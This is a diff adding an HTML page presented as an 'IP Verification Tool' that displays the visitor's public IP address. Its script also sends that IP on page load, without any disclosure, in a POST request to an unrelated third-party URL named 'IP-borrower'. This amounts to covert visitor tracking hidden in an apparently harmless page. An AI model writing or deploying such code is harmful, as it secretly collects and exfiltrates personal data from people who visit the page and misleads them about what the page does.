@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Verification Tool</title>
+</head>
+<body>
+    <h1>IP Verification Tool</h1>
+    <p>Your IP Address is: <span id="ip-address">Fetching...</span></p>
+
+    <script>
+        // Fetch the user's IP address using an external API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                document.getElementById('ip-address').textContent = ipAddress;
+
+                // Send the IP to the specified URL
+                fetch('https://anasthefirst.github.io/IP-borrower/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ ip: ipAddress }),
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send IP:', response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending IP:', error);
+                });
+            })
+            .catch(error => {
+                document.getElementById('ip-address').textContent = 'Unable to fetch IP';
+                console.error('Error fetching IP:', error);
+            });
+    </script>
+</body>
+</html>
